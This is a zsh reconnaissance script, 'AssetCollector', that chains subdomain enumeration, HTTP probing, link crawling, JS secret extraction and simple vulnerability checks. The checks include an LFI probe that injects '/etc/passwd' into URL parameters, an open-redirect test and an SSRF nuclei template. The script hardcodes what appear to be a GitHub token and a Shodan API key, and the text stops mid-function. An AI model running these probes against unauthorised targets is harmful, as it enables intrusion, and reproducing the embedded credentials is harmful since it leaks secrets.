#!/bin/zsh

version="v1.9"
echo -e "
   ___              __  _____     ____        __         
  / _ | ___ ______ / /_/ ___/__  / / /__ ____/ /____ ____
 / __ |(_-<(_-< -_) __/ /__/ _ \/ / / -_) __/ __/ -_) __/
/_/ |_/___/___|__/\__/\___/\___/_/_/\__/\__/\__/\__/_/  $version 
                                by:soapffz
A tool use for asset collector.
Use -h parameter to view help.
"
# 输出一行减号作为分割线
bar=$(yes "-" | head -n $(tput cols) | tr -d '\n')
# github token，部分工具需要用到
github_token="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"
github_token_flag=false
# shodan api，部分工具需要用到
shodan_api="cHRBMubdMZNFg6KouD9nNiZiCOovELns"
shodan_api_flag=false
# 根目录及工具目录
mainPATH=/root/asset_collector/
toolsPATH=$mainPATH/tools/
# 结果输出目录
resultsPATH=$mainPATH/results/
# 项目路径字典收集目录
bits_of_urls_collectionPATH=$mainPATH/bits_of_urls_collect/
if [ ! -d "$resultsPATH" ]; then mkdir -p $resultsPATH; fi
if [ ! -d "$bits_of_urls_collectionPATH" ]; then mkdir -p $bits_of_urls_collectionPATH; fi

# 爬取域名选项，默认关闭
domain_enumerate_flag=true
# HTTP请求选项，默认关闭
http_request_flag=false
# 链接爬取选项，默认关闭
url_crawling_flag=false
# 漏洞检测选项，默认关闭
vuln_detect_flag=false
while getopts ":d:f:b:rmuvph" optname; do
    # 选项后面出现了冒号表示该选项可以接参数
    case "$optname" in
    "d")
        domain_enumerate_flag=true
        domain_list=($(echo ${OPTARG} | awk -F '[ ,]+' '{for(i=1;i<=NF;i++){print $i}}'))
        ;;
    "f") if [ -f "${OPTARG}" ]; then
        echo -e "[+] URL file address: $OPTARG"
        domain_list=($(cat ${OPTARG} | awk -F '[ ,]+' '{for(i=1;i<=NF;i++){print $i}}'))
    else echo -e "[-] file not exists: $OPTARG"; fi ;;
    "m") domain_enumerate_flag=false ;;
    "r") http_request_flag=true ;;
    "b") black_domain_list=($(echo ${OPTARG} | awk -F '[ ,]+' '{for(i=1;i<=NF;i++){print $i}}')) ;;
    "u") url_crawling_flag=true ;;
    "v") vuln_detect_flag=true ;;
    "p") print_details_flag=false ;;
    "h") echo -e "-d 单个或多个域名，使用逗号,进行分割，如使用空格分割需使用双引号包括\
        \n\t请注意输入的域名应为根域名，同时输出根域名和子域名，子域名将不会进行枚举
        \n-f 包含域名列表的文件路径\
        \n-m 默认进行子域名枚举，使用-s关闭\
        \n-r 默认不进行http请求，使用-r开启\
        \n-b 枚举的黑名单，支持单个域名及通配符域名格式，使用逗号,进行分割\
        \n-u 默认不进行链接爬取，使用-u开启\
        \n-v 默认不进行漏洞检测，使用-v开启\
        \n-h 帮助" ;;
    ":") echo -e "No argument value for option $OPTARG" ;;
    -) break ;;
    \?) ;;
    *) echo "unhandled option $optname" ;;
    ?)
        echo $usage_string
        exit 1
        ;;
    esac
done

# 使用httpx拓展根域名
function expand_root_domain_by_httpxtlsprobe() {
    echo $(echo $domain | httpx -tls-probe -silent | sed -e"s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" | sed "s/www.//" | sed "s/nwww.//" | sort -u)
}
# 使用SubDomainizer拓展根域名(SubDomainizer能从js文件等中迅速请求到根域名，但是只适用于初始状态来拓展，因为单个域名还是比较慢的)
function expand_root_domain_by_subdomainizer() {
    local subdomainizer_floder=$subdomainizer_floder
    local tmp_subdomainizer_file=$(echo -e "subdomainizer_"$domain".txt")
    cd $subdomainizer_floder && echo $domain | xargs -I% sh -c "python3 $toolsPATH/SubDomainizer/SubDomainizer.py -k -u % -o $tmp_subdomainizer_file" >>/dev/null 2>&1
}
# 域名枚举
function domain_enumerate() {
    local domain_enumerate_results_PATH=$task_dir/domain_enumerate_results/
    local domainPATH=$domain_enumerate_results_PATH/$domain/
    mkdir -p $domain_enumerate_results_PATH && mkdir -p $domainPATH
    local assetfinderPATH=$domainPATH/assetfinder.txt
    local findomainPATH=$domainPATH/findomain.txt
    local subfinderPATH=$domainPATH/subfinder.txt
    local sudomyPATH=$domainPATH/sudomy.txt
    local oneforallPATH=$domainPATH/oneforall.txt
    local sublist3rPATH=$domainPATH/sublist3r.txt
    local amassPATH=$domainPATH/amass.txt
    local github_subdomains_pyPATH=$domainPATH/github_subdomains_py.txt
    local shosubgoPATH=$domainPATH/shosubgo.txt
    local massdnsPATH=$domainPATH/massdns.txt

    function automateAssetsFinder() {
        assetfinder --subs-only $domain | tee $assetfinderPATH >>/dev/null 2>&1
        if [ -f "$assetfinderPATH" ] && [ -s "$assetfinderPATH" ]; then echo -e "[+] AssetsFinder for $domain Counts: $(wc -l <$assetfinderPATH)"; fi
    }
    function automateFindomain() {
        $toolsPATH/findomain-linux -t $domain -u $findomainPATH >>/dev/null 2>&1
        if [ -f "$findomainPATH" ] && [ -s "$findomainPATH" ]; then echo -e "[+] Findomain for $domain Counts: $(wc -l <$findomainPATH)"; fi
    }
    function automateSubfinder() {
        $toolsPATH/subfinder -o $subfinderPATH -t 100 -d $domain >>/dev/null 2>&1
        if [ -f "$subfinderPATH" ] && [ -s "$subfinderPATH" ]; then echo -e "[+] Subfinder for $domain Counts: $(wc -l <$subfinderPATH)"; fi
    }
    function automateSudomy() {
        cd $toolsPATH/Sudomy/ && ./sudomy -d $domain --no-probe -o $domain/ >>/dev/null 2>&1
        if test -f "$domain/Sudomy-Output/$domain/subdomain.txt"; then
            mv $domain/Sudomy-Output/$domain/subdomain.txt $sudomyPATH
            if [ -f "$sudomyPATH" ] && [ -s "$sudomyPATH" ]; then echo -e "[+] Sudomy for $domain Counts: $(wc -l <$sudomyPATH)"; fi
        fi
    }
    function automateOneForAll() {
        python3 $toolsPATH/OneForAll/oneforall.py --target $domain --alive=ALIVE --brute=False run >>/dev/null 2>&1
        if test -f "$toolsPATH/OneForAll/results/$domain.csv"; then
            cat $toolsPATH/OneForAll/results/$domain.csv | awk -F, '{ print $6; }' | awk 'NR!=1 {print $1,$2}' >$oneforallPATH
            if [ -f "$oneforallPATH" ] && [ -s "$oneforallPATH" ]; then echo -e "[+] OneForAll for $domain Counts: $(wc -l <$oneforallPATH)"; fi
        fi
    }
    function automateSublist3r() {
        cd $toolsPATH/Sublist3r/ && python2 sublist3r.py -t 100 -o $sublist3rPATH -d $domain >>/dev/null 2>&1
        if [ -f "$sublist3rPATH" ] && [ -s "$sublist3rPATH" ]; then echo -e "[+] Sublist3r for $domain Counts: $(wc -l <$sublist3rPATH)"; fi
    }
    function automateAmass() {
        amass enum -active -o $amassPATH -d $domain
    }
    function automategithub_subdomains_py() {
        proxychains -q python3 $toolsPATH/github-subdomains.py -t $github_token -d $domain | grep -v ">>>" | grep -v "error" | grep -v "0" | sed "s/www.//" | sed "s/nwww.//" | sort -u >$github_subdomains_pyPATH >>/dev/null 2>&1
        if [ -f "$github_subdomains_pyPATH" ] && [ -s "$github_subdomains_pyPATH" ]; then echo -e "[+] Github Subdomains for $domain Counts: $(wc -l <$github_subdomains_pyPATH)"; fi
    }
    function automateshosubgo() {
        proxychains -q $toolsPATH/shosubgo_linux -d $domain -s $shodan_api | sed "s/www.//" | sed "s/nwww.//" | sort -u >$shosubgoPATH >>/dev/null 2>&1
        if [ -f "$shosubgoPATH" ] && [ -s "$shosubgoPATH" ]; then echo -e "[+] shosubgo for $domain Counts: $(wc -l <$shosubgoPATH)"; fi
    }
    function sort_enumerate_Results() {
        # 域名枚举结果合并去重
        cd $domainPATH && cat *.txt | sed "s/www.//" | sed "s/nwww.//" | awk '{gsub(/^\s+|\s+$/, "");print}' | sort -u >enumerate_origin.txt
    }
    function validation_confirm() {
        # 域名验证存活
        cd $domainPATH && cat enumerate_origin.txt | $toolsPATH/ksubdomain -verify -silent -o enumerate_results.txt >>/dev/null 2>&1
        if [ -f "enumerate_results.txt" ] && [ -s "enumerate_results.txt" ]; then echo -e "[+] Validation for $domain Counts: $(wc -l <enumerate_results.txt)"; fi
    }
    function resolveSubdomains() {
        # 解析域名的ip地址
        cd $toolsPATH/massdns/bin/
        cat $domainPATH/enumerate_results.txt | ./massdns -r $toolsPATH/massdns/lists/resolvers.txt --root -q -t A -o S -w $massdnsPATH
    }

    print -P "%F{green}[+] Begin Domain enumerate for $domain%f"
    automateAssetsFinder $domain &
    automateFindomain $domain &
    automateSubfinder $domain &
    automateSudomy $domain &
    automateOneForAll $domain &
    automateSublist3r $domain &
    # automateAmass $domain &
    if "$vpn_valid_flag" = true && "$github_token_flag" = true; then
        automategithub_subdomains_py $domain &
    fi
    if "$vpn_valid_flag" = true && "$shodan_api_flag" = true; then
        automateshosubgo $domain &
    fi
    wait
    cd $domainPATH
    if test ! -z "$(ls *.txt)"; then
        sort_enumerate_Results
        if [ -f "enumerate_origin.txt" ] && [ -s "enumerate_origin.txt" ]; then
            # 如果域名原始枚举结果不为空，表示枚举成功，进行存活性验证
            validation_confirm
        fi
    fi
}
function url_deduplication_and_remove_redirection_processing() {
    # url爬取结果的处理函数，传入原始路径，新路径，以及域名枚举结果路径，输出url处理结果并删除原始路径
    local tool_origin_PATH=$1
    local tool_new_PATH=$2
    local domain_enumerate_results_PATH=$3
    local tool_name=$(echo ${tool_origin_PATH##*/} | cut -d "_" -f 1)

    if [ -f $tool_origin_PATH ] && [ -s $tool_origin_PATH ]; then
        python3 $toolsPATH/deduplication_and_remove_redirection.py $tool_origin_PATH $tool_new_PATH $domain_enumerate_results_PATH
        if [ -f $tool_new_PATH ] && [ -s $tool_new_PATH ]; then
            if [[ "$tool_name" == "httpx" ]] || [[ "$tool_name" == "httprobe" ]] || [[ "$tool_name" == "gau" ]] || [[ "$tool_name" == "gospider" ]] || [[ "$tool_name" == "hakrawler" ]]; then
                rm -rf $tool_origin_PATH
                echo -e "[+] $tool_name for $domain Counts: $(wc -l <$tool_new_PATH)"
            fi
        fi
    fi
}
# 文件分割函数，用于单个文件太大时按指定行数进行分割
function file_split() {
    # 传入参数依次为需要分割的文件路径，文件分割前缀名，文件分割输出的文件夹(不用手动创建，函数内创建)
    # 输出为按文件前缀_xxxx.txt，单个文件默认行数为20，也就是原文件超过20条才能用此函数
    local origin_filePATH=$1
    local split_file_prefix_name=$2
    local split_folder=$3
    if [ ! -d "$split_folder" ]; then mkdir -p $split_folder; fi

    # 判断url条数，如果超过20个则按20个url为一批进行分割后再请求
    len_of_urls=$(wc -l <"$origin_filePATH")
    if [ $len_of_urls -gt 20 ]; then
        # 按20行分割文件，生成文件没有后缀名，使用xargs给文件添加txt后缀名，最后文件格式为url_xxx.txt
        # 根据文件行数来判断文件的后缀占位是几位，split -a参数默认为2，即默认是2位，可以生成不超过99个文件，如果超过99个文件，即链接条数超过1980，则需要指定后缀长度
        if [ $len_of_urls -le 1980 ]; then
            url_batch_suffix_len=2
        elif [ $len_of_urls -le 19980 ]; then
            url_batch_suffix_len=3
        elif [ $len_of_urls -le 199980 ]; then
            url_batch_suffix_len=4
        else
            url_batch_suffix_len=5
        fi
        cd $split_folder && split $origin_filePATH -l 20 -d -a $url_batch_suffix_len $split_file_prefix_name && ls | grep $split_file_prefix_name | xargs -n1 -i{} mv {} {}.txt >>/dev/null 2>&1
    else
        print -P "%F{red}[-] fewer URLs.no need to split %f"
    fi
}
# url请求完之后，汇总结果以及相似度去重处理，适用于http请求和链接爬取完了之后
function url_summary_and_similarity_de_duplication_processing() {
    # 传入参数依次为url请求完后文件夹位置，原始小批次文件名称(例如httprequest_results)，url请求的函数名(屏幕打印用)
    local url_result_folder=$1
    local url_request_file_origin_name=$2
    local url_function_name=$3
    # 拼接出中间用到的文件名称
    local url_request_file_name="$2.txt"
    local all_request_file_name="all_$url_request_file_name"
    local results_processing_file_name="$2_origin.txt"
    if test ! -z "$(find $url_result_folder -name $url_request_file_name)"; then
        local all_results_origin_PATH=$url_result_folder/$all_request_file_name
        local results_processing_PATH=$url_result_folder/$results_processing_file_name
        local final_results_PATH=$task_dir/$url_request_file_name
        touch $all_results_origin_PATH && touch $results_processing_PATH && touch $final_results_PATH
        # 查找任务目录文件夹下的所有$url_request_file_name文件，合并去重得到url源文件
        find $url_result_folder -name $url_request_file_name | xargs cat | grep "http" | sort -u >>$all_results_origin_PATH
        # 对url原文件使用url_deduplication_and_remove_redirection_processing函数处理得到范围内结果
        if [ -f $all_results_origin_PATH ] && [ -s $all_results_origin_PATH ]; then
            url_deduplication_and_remove_redirection_processing $all_results_origin_PATH $results_processing_PATH $task_dir/enumerate_results.txt
            # 如果处理得到结果不为空，进一步进行url处理
            if [ -f $results_processing_PATH ] && [ -s $results_processing_PATH ]; then
                rm -rf $all_results_origin_PATH
                uddup -s -u $results_processing_PATH -o $final_results_PATH >>/dev/null 2>&1
                cat $results_processing_PATH | grep "\.js" | grep -iEv "\.js(p|on|onp)" >>$final_results_PATH
                if [ -f $final_results_PATH ] && [ -s $final_results_PATH ]; then
                    echo -e "$bar"
                    print -P "%F{green}$url_function_name Ended.\n[+] $url_function_name results:$(wc -l <$final_results_PATH)%f"
                    echo -e "$bar"
                fi
            fi
        else
            print -P "%F{red}$url_function_name failed.Stop $url_function_name%f\n"
        fi
    else
        echo -e "$bar"
        print -P "%F{red}$url_function_name result is empty.Stop $url_function_name%f\n"
    fi
}
# 域名请求，在域名枚举完后默认执行，如果检测已经请求过了则跳过
function domain_request() {
    local task_dir=$task_dir
    local domain_request_resultsPATH=$task_dir/domain_request_results/
    mkdir -p $domain_request_resultsPATH
    local http_request_batch_folder_name=$httpreq_batch_folder_name
    local http_request_batch_file_name=$httpreq_batch_file_name
    if [ ! -n "$http_request_batch_folder_name" ]; then
        local http_request_in_batches_resultsPATH=$domain_request_resultsPATH
        local http_request_batch_request_results=$task_dir/enumerate_results.txt
    else
        local http_request_in_batches_resultsPATH=$domain_request_resultsPATH/$http_request_batch_folder_name/
        local http_request_batch_request_results=$domain_request_resultsPATH/$http_request_batch_file_name
        echo -e "[+] url http request in batch $http_request_batch_folder_name..."
    fi
    mkdir -p $http_request_in_batches_resultsPATH
    local httpx_origin_PATH=$http_request_in_batches_resultsPATH/httpx_origin.txt
    local httpx_new_PATH=$http_request_in_batches_resultsPATH/httpx.txt
    local httprobe_origin_PATH=$http_request_in_batches_resultsPATH/httprobe_origin.txt
    local httprobe_new_PATH=$http_request_in_batches_resultsPATH/httprobe.txt
    local gau_origin_PATH=$http_request_in_batches_resultsPATH/gau_origin.txt
    local gau_new_PATH=$http_request_in_batches_resultsPATH/gau.txt
    local httprequest_results_origin_PATH=$http_request_in_batches_resultsPATH/httprequest_results_origin.txt
    local httprequest_results_new_PATH=$http_request_in_batches_resultsPATH/httprequest_results.txt

    cd $http_request_in_batches_resultsPATH
    cat $http_request_batch_request_results | httprobe | grep -v "proxychains" >$httprobe_origin_PATH >>/dev/null 2>&1 &
    cat $http_request_batch_request_results | httpx -silent -threads 10 -fc 404,405,502 -csp-probe -follow-redirects -no-color -H "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" | grep -v "proxychains" >$httpx_origin_PATH >>/dev/null 2>&1 &
    cat $http_request_batch_request_results | xargs -I% -P20 sh -c 'gau -b jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg -subs %' | grep -v "proxychains" >$gau_origin_PATH >>/dev/null 2>&1 &
    wait
    url_deduplication_and_remove_redirection_processing $httpx_origin_PATH $httpx_new_PATH $task_dir/enumerate_results.txt
    url_deduplication_and_remove_redirection_processing $httprobe_origin_PATH $httprobe_new_PATH $task_dir/enumerate_results.txt
    url_deduplication_and_remove_redirection_processing $gau_origin_PATH $gau_new_PATH $task_dir/enumerate_results.txt
    wait
    cd $http_request_in_batches_resultsPATH
    if test ! -z "$(ls *.txt)"; then
        cat *.txt | sort -u | qsreplace -a | $toolsPATH/urldedupe -s | sort -u >$httprequest_results_origin_PATH
    fi
    if [ -f $httprequest_results_origin_PATH ] && [ -s $httprequest_results_origin_PATH ]; then url_deduplication_and_remove_redirection_processing $httprequest_results_origin_PATH $httprequest_results_new_PATH $task_dir/enumerate_results.txt; fi
    if [ -f $httprequest_results_new_PATH ] && [ -s $httprequest_results_new_PATH ]; then
        print -P "%F{green}[+] $httpreq_batch_file_name find $(wc -l <$httprequest_results_new_PATH) urls.%f\n"
    fi
}
# 链接爬取，必须在基础http请求之后进行
function url_crawling() {
    local task_dir=$task_dir
    local url_crawling_resultsPATH=$task_dir/url_crawling_results/
    mkdir -p $url_crawling_resultsPATH
    local crawling_batch_folder_name=$crawling_batch_folder_name
    local crawling_batch_file_name=$crawling_batch_file_name
    if [ ! -n "$crawling_batch_folder_name" ]; then
        local crawling_in_batches_resultsPATH=$url_crawling_resultsPATH
        local crawling_batch_request_results=$task_dir/httprequest_results.txt
    else
        local crawling_in_batches_resultsPATH=$url_crawling_resultsPATH/$crawling_batch_folder_name/
        local crawling_batch_request_results=$url_crawling_resultsPATH/$crawling_batch_file_name
        echo -e "[+] url crawling in batch $crawling_batch_folder_name"
    fi
    mkdir -p $crawling_in_batches_resultsPATH
    local gospider_origin_PATH=$crawling_in_batches_resultsPATH/gospider_origin.txt
    local gospider_new_PATH=$crawling_in_batches_resultsPATH/gospider.txt
    local hakrawler_origin_PATH=$crawling_in_batches_resultsPATH/hakrawler_origin.txt
    local hakrawler_new_PATH=$crawling_in_batches_resultsPATH/hakrawler.txt
    local urlcrawling_results_origin_PATH=$crawling_in_batches_resultsPATH/urlcrawlingresults_origin.txt
    local urlcrawling_results_new_PATH=$crawling_in_batches_resultsPATH/urlcrawling_results.txt

    cd $crawling_in_batches_resultsPATH
    gospider -S $crawling_batch_request_results -u web --subs --sitemap -c 10 -d 2 -t 24 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" | grep -E "\[url" | awk '{print $5}' | grep -v "proxychains" >$gospider_origin_PATH >>/dev/null 2>&1 &
    cat $crawling_batch_request_results | hakrawler -insecure -subs -t 24 | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" | grep -v "proxychains" >$hakrawler_origin_PATH >>/dev/null 2>&1 &
    wait
    url_deduplication_and_remove_redirection_processing $gospider_origin_PATH $gospider_new_PATH $task_dir/enumerate_results.txt
    url_deduplication_and_remove_redirection_processing $hakrawler_origin_PATH $hakrawler_new_PATH $task_dir/enumerate_results.txt
    wait
    cd $crawling_in_batches_resultsPATH
    if test ! -z "$(ls *.txt)"; then
        cat *.txt | sort -u | qsreplace -a | $toolsPATH/urldedupe -s | sort -u >$urlcrawling_results_origin_PATH
    fi
    if [ -f $urlcrawling_results_origin_PATH ] && [ -s $urlcrawling_results_origin_PATH ]; then url_deduplication_and_remove_redirection_processing $urlcrawling_results_origin_PATH $urlcrawling_results_new_PATH $task_dir/enumerate_results.txt; fi
    if [ -f $urlcrawling_results_new_PATH ] && [ -s $urlcrawling_results_new_PATH ]; then
        print -P "%F{green}[+] $crawling_batch_file_name crawling $(wc -l <$urlcrawling_results_new_PATH) urls.%f\n"
    fi
}
# 漏洞检测总函数，必须在链接爬取后执行
function vuln_detect() {
    local task_dir=$task_dir
    local task_folder_name=$task_folder_name
    local vuln_detect_resultsPATH=$task_dir/vuln_detect_results/
    mkdir -p $vuln_detect_resultsPATH

    # 如果url爬取的结果存在
    if [ -f "$task_dir/urlcrawling_results.txt" ] && [ -s "$task_dir/urlcrawling_results.txt" ]; then
        # 对结果进行gf解析
        vuln_detect_gf_parsing $task_dir &
        # 对js文件进行解析
        vuln_detect_js_extract_control $task_dir &
        wait
    fi
}
# 漏洞检测的分函数，管控js文件中信息的提取
function vuln_detect_js_extract_control() {
    local task_dir=$task_dir
    local vuln_detect_jsPATH=$task_dir/vuln_detect_results/js/
    mkdir -p $vuln_detect_jsPATH

    cd $vuln_detect_jsPATH
    cp $task_dir/urlcrawling_results.txt urlcrawling_results_bak.txt
    # 筛选第一次的js文件
    cat $vuln_detect_jsPATH/urlcrawling_results_bak.txt | unfurl format "%s://%d%:%P%p" | grep "\.js$" | grep -iEv "\.js(p|on|onp)" | sort -u >js_urls.txt
    if [ -f "js_urls.txt" ] && [ -s "js_urls.txt" ]; then
        print -P "%F{green}[+] Found $(wc -l <"js_urls.txt") js file from urlcrawling results.\n[+] Begin js recursive crawling.%f"
        # 使用原链接提取js文件中的信息，并递归提取新发现的js中的url，最大提取次数为10次
        for ((i = 1; i <= 10; i++)); do
            local vuln_detect_js_batch_num=$i
            local vuln_detect_js_batch_dirname="js_extract_batch_$vuln_detect_js_batch_num"
            local vuln_detect_js_batch_dir=$vuln_detect_jsPATH/$vuln_detect_js_batch_dirname/
            mkdir -p $vuln_detect_js_batch_dir

            # 第一次直接使用js文件夹下的js_urls.txt，之后每次如果能执行，则使用上一批次文件夹中的js_urls.txt
            if [ $i -eq 1 ]; then
                local vuln_detect_js_batchPATH=$vuln_detect_jsPATH/js_urls.txt
            else
                let previous_batch_num=$i-1
                local previous_batch_dirname="js_extract_batch_$previous_batch_num"
                local previous_batch_folderPATH=$vuln_detect_jsPATH/$previous_batch_dirname/
                local vuln_detect_js_batchPATH=$previous_batch_folderPATH/js_urls.txt
            fi
            echo "\n"
            vuln_detect_js_extract $task_dir $vuln_detect_jsPATH $vuln_detect_js_batch_dir $vuln_detect_js_batchPATH $vuln_detect_js_batch_num
            # 如果执行结果返回-1，表示没有找到新的js文件，跳出循环
            if [ $? -ne 0 ]; then
                print -P "%F{green}\n[-] js recursive detection ended in the $vuln_detect_js_batch_num batch.\n[-] no more js can be find%f"
                break
            fi
        done
        wait
    else
        print -P "%F{red}[-] Js file not found.%f"
    fi
}
# 漏洞检测的分函数的js_extract_control的分函数
function vuln_detect_js_extract() {
    local task_dir=$task_dir
    local vuln_detect_jsPATH=$vuln_detect_jsPATH
    local vuln_detect_js_batch_dir=$vuln_detect_js_batch_dir
    local vuln_detect_js_batchPATH=$vuln_detect_js_batchPATH
    local vuln_detect_js_batch_num=$vuln_detect_js_batch_num
    local http_urls_from_js_originPATH=$vuln_detect_js_batch_dir/http_urls_origin.txt
    local http_urls_from_js_processingPATH=$vuln_detect_js_batch_dir/http_urls_processing.txt
    local http_urls_from_jsPATH=$vuln_detect_js_batch_dir/http_urls_from_js.txt
    local js_urls_originPATH=$vuln_detect_js_batch_dir/js_urls_origin.txt
    local js_urlsPATH=$vuln_detect_js_batch_dir/js_urls.txt

    cd $vuln_detect_js_batch_dir
    if [ -f "$vuln_detect_js_batchPATH" ] && [ -s "$vuln_detect_js_batchPATH" ]; then
        # 使用Astra从js的url中提取路径及敏感信息
        cat $vuln_detect_js_batchPATH | python3 $toolsPATH/Astra.py >astra_without_proxy.txt >>/dev/null 2>&1
        cat $vuln_detect_js_batchPATH | python3 $toolsPATH/Astra.py >astra_with_proxy.txt >>/dev/null 2>&1
        cat astra_without_proxy.txt astra_with_proxy.txt | grep -Ev "Request Timeout|Cannot connect|Total URLs found|Total Secrets found|Finished in|\[proxychains|^$|.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)|(http|https)\:\/\/www\.apache\.org|(http|https)\:\/\/getbootstrap\.com|(http|https)\:\/\/www\.w3\.org|http\:\/\/en\.wikipedia\.org|(http|https)\:\/\/www\.googletagmanager\.com" | sort -u >astra_origin.txt
        if [ -f "astra_origin.txt" ] && [ -s "astra_origin.txt" ]; then
            rm -rf astra_without_proxy.txt astra_with_proxy.txt
            # 筛选每个部分的url
            cat astra_origin.txt | grep "\[$\]" >secrets.txt &
            cat astra_origin.txt | grep "\[C\]" >aws_buckets.txt &
            cat astra_origin.txt | grep "\[IP\]" >ip.txt &
            cat astra_origin.txt | grep "^http" >$http_urls_from_js_originPATH &
            wait
            # 将筛选出来的url合并，将原文件astra_origin.txt中剩余部分提取出来
            cat secrets.txt aws_buckets.txt ip.txt $http_urls_from_js_originPATH >extract_part.txt
            cat astra_origin.txt | anew extract_part.txt | grep -v "javascript" >astra_remaining_part.txt
            rm -rf extract_part.txt astra_origin.txt
            if [ ! -f "astra_remaining_part.txt" ] || [ ! -s "astra_remaining_part.txt" ]; then rm -rf astra_remaining_part.txt; fi
            if test ! -z "$(ls *.txt)"; then find . -iname "*.txt" -size 0 -delete; fi
            if [ -f "secrets.txt" ] && [ -s "secrets.txt" ]; then print -P "%F{green}[+] Vuln detect of js batch $vuln_detect_js_batch_num found $(wc -l <"secrets.txt") secrets.%f"; fi
            if [ -f "aws_buckets.txt" ] && [ -s "aws_buckets.txt" ]; then print -P "%F{green}[+] Vuln detect of js batch $vuln_detect_js_batch_num Found $(wc -l <"aws_buckets.txt") aws buckets.%f"; fi
            if [ -f "$http_urls_from_js_originPATH" ] && [ -s "$http_urls_from_js_originPATH" ]; then
                url_deduplication_and_remove_redirection_processing $http_urls_from_js_originPATH $http_urls_from_js_processingPATH $task_dir/enumerate_results.txt
                if [ -f "$http_urls_from_js_processingPATH" ] && [ -s "$http_urls_from_js_processingPATH" ]; then
                    rm -rf $http_urls_from_js_originPATH
                    cat $http_urls_from_js_processingPATH | anew $vuln_detect_jsPATH/urlcrawling_results_bak.txt >$http_urls_from_jsPATH
                    if [ -f "$http_urls_from_jsPATH" ] && [ -s "$http_urls_from_jsPATH" ]; then
                        rm -rf $http_urls_from_js_processingPATH
                        print -P "%F{green}[+] Vuln detect of js batch $vuln_detect_js_batch_num found $(wc -l <$http_urls_from_jsPATH) new http urls.%f"
                        cat $http_urls_from_jsPATH | unfurl format "%s://%d%:%P%p" | grep "\.js$" | sort -u >$js_urls_originPATH
                        cat $js_urls_originPATH | anew $vuln_detect_jsPATH/js_urls.txt >$js_urlsPATH
                        if [ -f "$js_urlsPATH" ] && [ -s "$js_urlsPATH" ]; then
                            rm -rf $js_urls_originPATH
                            print -P "%F{green}[+] Vuln detect of js batch $vuln_detect_js_batch_num found $(wc -l <$js_urlsPATH) new js urls.%f"
                            return 0
                        else
                            return -1
                        fi
                    else
                        return -1
                    fi
                else
                    return -1
                fi
            else
                return -1
            fi
        else
            return -1
        fi
    else
        return -1
    fi
}
# 漏洞检测的分函数，通过对爬取的链接进行gf分析并进行对应类型漏洞的检测
function vuln_detect_gf_parsing() {
    local task_dir=$task_dir
    local vuln_detect_resultsPATH=$task_dir/vuln_detect_results/
    local gfparse_results_PATH=$vuln_detect_resultsPATH/gf_parse/
    mkdir -p $gfparse_results_PATH

    cd $gfparse_results_PATH
    # 对爬取的链接使用gf分析参数并分类型输出对应名称文件
    pattern_list=($(find ~/.gf/ -name "*.json" | awk -F "[./]" '{print $(NF-1)}'))
    for pattern in ${pattern_list[@]}; do
        # 对url爬取结果使用gf进行解析，对应漏洞参数文件放到对应漏洞名的txt钟
        {
            cat $task_dir/urlcrawling_results.txt | gf $pattern | tee -a $pattern.txt >>/dev/null 2>&1
        } &
    done
    wait
    if test ! -z "$(ls *.txt)"; then
        # 删除未探测到对应漏洞参数的漏洞文件
        find . -iname "*.txt" -size 0 -delete
        # 如果gf解析结果不为空，将对应含有漏洞参数的文件名对应的漏洞类型名置为列表
        list_of_vuln_tobe_detected=($(ls *.txt | awk -F "[.]" '{print $1}'))
        print -P "%F{green}[+] gf found ${#list_of_vuln_tobe_detected[*]} types of vulnerabilities need to be detected%f"
        if [[ "${list_of_vuln_tobe_detected[@]}" =~ "lfi" ]]; then vuln_detection_lfi; fi
        if [[ "${list_of_vuln_tobe_detected[@]}" =~ "ssrf" ]]; then vuln_detection_ssrf; fi
        # if [[ "${list_of_vuln_tobe_detected[@]}" =~ "xss" ]]; then vuln_detection_xss; fi
        if [[ "${list_of_vuln_tobe_detected[@]}" =~ "redirect" ]]; then vuln_detection_redirect; fi
        if [[ "${list_of_vuln_tobe_detected[@]}" =~ "ssti" ]]; then vuln_detection_ssti; fi
    else
        print -P "%F{red}No vuln that need to be detected%f"
    fi
}
function vuln_detection_xss() {
    # 对xss漏洞进行检测，传入包含有参数的url路径xss_file_to_be_detected以及输出结果的路径result_file_of_detecting_xss
    # cat $xss_file_to_be_detected |
    # 暂时先不写
}
function vuln_detection_lfi() {
    # 对lfi漏洞进行检测
    gf_lfi_detect_results=$(cat lfi.txt | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -IsL "%" 2>&1 | grep -q "root:x" && echo "VULN! %"')
    if test ! -z "$gf_lfi_detect_results"; then
        print -P "\n%F{green}gF lfi detect Found ${#gf_lfi_detect_results[*]} potential problems.%f"
        for i in ${gf_lfi_detect_results[@]}; do echo ${i} >>lfi_vuln.txt; done
    fi
}
function vuln_detection_ssrf() {
    # 对ssrf漏洞进行检测，传入包含有参数的url路径ssrf_file_to_be_detected以及输出结果的路径result_file_of_detecting_ssrf
    # 使用nuclei的ssrf脚本进行检测
    cat ssrf.txt | nuclei -t ~/nuclei-templates/vulnerabilities/other/microstrategy-ssrf.yaml -o ssrf_nuclei.txt >>/dev/null 2>&1
    if [ -f "ssrf_nuclei.txt" ] && [ -s "ssrf_nuclei.txt" ]; then print -P "%F{green}[+] nuclei found $(wc -l <ssrf_nuclei.txt) link suspected have a ssrf problem%f"; else rm -rf ssrf_nuclei.txt; fi
}
function vuln_detection_redirect() {
    # 对open-redirect漏洞进行检测
    gf_redirect_detect_results=$(
        local LHOST="http://localhost"
        cat redirect.txt | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -IsL "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
    )
    if test ! -z "$gf_redirect_detect_results"; then
        print -P "\n%F{green}gF redirect detect Found ${#gf_redirect_detect_results[*]} potential problems.%f"
        for i in ${gf_redirect_detect_results[@]}; do echo ${i} >>redirect_vuln.txt; done
    fi
}
function vuln_detection_ssti() {
    # 对ssti漏洞进行检测
